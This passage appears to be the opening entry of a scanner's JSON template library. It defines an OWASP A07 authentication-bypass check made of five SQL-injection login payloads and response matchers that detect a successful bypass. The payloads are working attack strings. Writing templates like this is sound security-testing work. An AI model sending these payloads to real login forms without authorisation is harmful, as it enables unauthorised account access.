[
  {
    "id": "owasp-a07-auth-bypass-sqli",
    "info": {
      "name": "OWASP A07 - Authentication Bypass via SQL Injection",
      "severity": "critical",
      "category": "auth-bypass",
      "description": "SQL injection to bypass authentication (OWASP A07:2025 - Authentication Failures)",
      "references": [
        "https://owasp.org/Top10/2025/A07_2025-Authentication_Failures/"
      ],
      "tags": [
        "owasp-a07",
        "authentication",
        "auth-bypass",
        "sqli"
      ]
    },
    "payloads": [
      {
        "value": "admin' OR '1'='1'--",
        "encoding": "none",
        "method": "POST"
      },
      {
        "value": "' OR 1=1--",
        "encoding": "none",
        "method": "POST"
      },
      {
        "value": "admin'--",
        "encoding": "none",
        "method": "POST"
      },
      {
        "value": "') OR ('1'='1",
        "encoding": "none",
        "method": "POST"
      },
      {
        "value": "admin' /*",
        "encoding": "none",
        "method": "POST"
      }
    ],
    "matchers": [
      {
        "type": "response_body",
        "condition": "contains",
        "patterns": [
          "welcome",
          "dashboard",
          "logged in"
        ]
      },
      {
        "type": "response_status",
        "condition": "equals",
        "patterns": ["302", "200"]
      }
    ]
  },
